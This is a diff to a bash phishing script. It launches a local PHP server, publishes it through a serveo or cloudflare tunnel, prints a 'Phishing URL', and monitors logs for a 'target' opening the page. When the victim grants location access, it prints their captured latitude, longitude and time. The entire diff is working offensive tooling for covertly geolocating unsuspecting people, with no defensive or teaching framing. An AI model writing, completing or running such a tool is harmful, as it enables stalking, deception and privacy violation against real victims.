@@ -110,40 +110,30 @@ select opt in "${options[@]}"; do
     esac
 done
 
-#!/bin/bash
+start_server
 
-# ... [previous code remains same until start_server function]
+case $TUNNEL in
+    "serveo") serveo_tunnel ;;
+    "cloudflare") cloudflare_tunnel ;;
+esac
 
-start_server() {
-    echo -e "${GREEN}[+] Starting PHP server on port 8080...${NC}"
-    # Create logs file if not exists
-    touch logs.txt
-    php -S 127.0.0.1:8080 -t "$PAGE" > /dev/null 2>&1 &
-    SERVER_PID=$!
-}
+[ -z "$URL" ] && { echo -e "${RED}[!] Tunnel failed!${NC}"; cleanup; }
 
-# ... [rest of the code remains same]
+echo -e "\n${YELLOW}[+] Phishing URL: $URL${NC}"
+echo -e "${BLUE}[+] Waiting for target... (Ctrl+C to stop)${NC}"
 
-# Monitor logs - UPDATED SECTION
-touch logs.txt  # Ensure file exists
-echo -e "\n${CYAN}=== LIVE SESSION STARTED ===${NC}"
-tail -f logs.txt --retry 2>/dev/null | while read line; do
-    DATA=$(echo "$line" | jq -r '.' 2>/dev/null)
-    [ -z "$DATA" ] && continue
-    
-    STATUS=$(echo "$DATA" | jq -r '.status // empty')
-    
-    case $STATUS in
-        "page_loaded")
-            echo -e "\n${CYAN}[+] Target opened the page${NC}"
-            ;;
-        "location_denied")
-            echo -e "${YELLOW}[!] Target denied location access${NC}"
-            ;;
+trap cleanup INT
+
+# Monitoring
+tail -f logs.txt | while read -r line; do
+    DATA=$(echo "$line" | jq -r '.')
+    case $(echo "$DATA" | jq -r '.status') in
+        "page_loaded") echo -e "\n${CYAN}[+] Target opened page${NC}" ;;
+        "location_denied") echo -e "${YELLOW}[!] Location denied${NC}" ;;
         "location_granted")
             echo -e "\n${GREEN}[✓] Location captured!${NC}"
-            echo -e "   🌐 Latitude: $(echo "$DATA" | jq -r '.lat')"
-            echo -e "   🌐 Longitude: $(echo "$DATA" | jq -r '.lon')"
+            echo -e "   🌍 Lat: $(echo "$DATA" | jq -r '.lat')"
+            echo -e "   🌎 Lon: $(echo "$DATA" | jq -r '.lon')"
             echo -e "   🕒 Time: $(echo "$DATA" | jq -r '.time')"
             cleanup
             ;;
